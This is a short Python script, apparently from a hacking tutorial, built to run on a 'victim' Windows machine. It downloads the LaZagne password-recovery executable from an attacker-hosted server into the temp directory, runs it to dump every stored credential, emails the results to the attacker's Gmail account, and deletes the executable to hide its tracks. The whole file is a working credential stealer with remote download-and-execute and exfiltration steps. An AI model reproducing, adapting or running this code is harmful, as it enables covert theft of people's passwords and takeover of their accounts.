#!/usr/bin/python2.7
# The LaZagne project is an open source application used to retrieve unprotected passwords stored on a local computer.
# https://github.com/AlessandroZ/LaZagne/releases download the .exe file
# it works on Windows, linux, mac but in this script we use lazagne.exe to recover passwords
# copy the script to victim machine(windows) this scripts should run on victim side windows_host


import requests
import subprocess
import smtplib
import os
import tempfile


def download(url):
    get_request = requests.get(url)
    # print (get_request.content)
    # print (get_request)

    with open("lazagne.exe", "wb") as file:
        file.write(get_request.content)


def send_mail(email, password, message):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()


# store secretly downloaded file in temp directory and delete later automatically
temp_directory = tempfile.gettempdir()
os.chdir(temp_directory)
download("http://localhost where lazagne .exe is stored")
# host lazagne.exe on webserver, put that link to download the lazagne.exe or
# copy the lazagne.exe to victim and run this script in that path
result = subprocess.check_output("lazagne.exe all", shell=True)
send_mail("mail@gmail.com", "password", result)
os.remove("lazagne.exe")
